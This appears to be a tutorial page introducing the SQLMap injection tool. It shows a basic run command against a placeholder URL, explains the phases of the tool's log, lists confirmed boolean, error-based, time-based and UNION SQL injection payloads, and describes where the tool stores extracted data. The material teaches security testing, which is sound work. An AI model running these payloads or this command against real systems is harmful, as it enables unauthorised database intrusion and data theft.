# Getting Started with SQLMap

The basic scenario covers the most common starting point: a GET parameter passed directly into a SQL query without sanitisation. SQLMap's output from this single run demonstrates everything the tool does automatically before you even specify what to extract.

***

## Help System

```bash
sqlmap -h    # Basic options (sufficient for most use cases)
sqlmap -hh   # Full advanced options list
```

The two-tier help system reflects SQLMap's depth. The basic `-h` output covers target, request, detection, and output options. The advanced `-hh` output adds tamper scripts, fingerprinting, optimisation, and injection technique fine-tuning. New users should work through `-h` first and only reach for `-hh` when a specific scenario demands it.

***

## The Basic Run Command

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

Two flags are all that is needed to start:

- `-u` provides the target URL including the vulnerable parameter
- `--batch` suppresses all interactive prompts, automatically accepting default answers

`--batch` is essential for scripted assessments and avoids the tool stalling on questions like "do you want to skip other DBMS payloads?" or "keep testing other parameters?" Every interactive prompt has a sensible default that `--batch` selects automatically.

***

## Reading SQLMap's Output

The output from a basic run tells a complete story. Understanding each phase helps interpret results and diagnose why a scan may have missed something:

| Phase | Log Message Pattern | What It Means |
|-------|-------------------|--------------|
| Connectivity | `testing connection to target URL` | Basic reachability check |
| Stability | `target URL content is stable` | Baseline response captured for comparison |
| Dynamic check | `GET parameter 'id' appears to be dynamic` | Changing the value changes the response |
| Heuristic | `might be injectable (possible DBMS: MySQL)` | Quick single-quote test triggered an error |
| Technique tests | `testing 'AND boolean-based blind'` | Systematic payload testing begins |
| Confirmation | `GET parameter 'id' is vulnerable` | Confirmed injection, payloads shown |
| Summary | `fetched data logged to...` | Results saved to local output directory |

The heuristic XSS note (`might be vulnerable to XSS attacks`) is a bonus detection SQLMap performs automatically, though it does not exploit XSS.

***

## Understanding the Confirmed Payloads

SQLMap's final report shows exactly what it found and the raw payload for each technique:

```
Boolean-based blind:
id=1 AND 8814=8814

Error-based (FLOOR):
id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(
  0x7170706a71,
  (SELECT (ELT(7744=7744,1))),
  0x71707a7871,
  FLOOR(RAND(0)*2))x
FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

Time-based blind:
id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

UNION query (3 columns, NULL-based):
id=1 UNION ALL SELECT NULL,NULL,CONCAT(
  0x7170706a71,
  0x554d766a...,
  0x71707a7871)-- -
```

The hex strings (`0x7170706a71`, `0x71707a7871`) are SQLMap's delimiters. They decode to `qppjq` and `qpzxq`, chosen because they are unlikely to appear naturally in any real database content, making it easy for SQLMap to extract its injected values from the page response cleanly.

The UNION payload uses `NULL` rather than numbers as fillers, confirming what the module covered: NULL is compatible with every data type and avoids type mismatch errors during column count detection.

***

## What SQLMap Does in 46 Requests

The entire detection phase completed in 46 HTTP requests. That covers:

```
1 request   → Baseline response capture
1 request   → Parameter dynamic check
~5 requests → Heuristic tests (quote, XSS)
~10 requests → Boolean-based blind confirmation
~10 requests → Error-based testing
~10 requests → Time-based blind (requires SLEEP delays)
~9 requests → UNION column count (ORDER BY method)
1 request   → UNION technique confirmation
```

This efficiency comes from SQLMap's adaptive logic: once it fingerprints MySQL from the heuristic test, it skips payloads for PostgreSQL, MSSQL, Oracle, and every other DBMS. The question `Do you want to skip test payloads specific for other DBMSes?` that `--batch` answers with Y is what enables this optimisation.

***

## Output Storage

SQLMap automatically saves all findings to:

```
~/.sqlmap/output/www.example.com/
```

This directory persists between runs. If you run SQLMap against the same target again, it resumes from where it left off rather than re-running all detection tests. The directory contains:

| File | Contents |
|------|---------|
| `log` | Full session log |
| `target.txt` | Target details |
| `dump/` | Extracted table data as CSV files |
| `files/` | Files read from server via `LOAD_FILE` |

This persistence is important on long engagements where a session may be interrupted. Re-running the same command continues extraction rather than starting over.
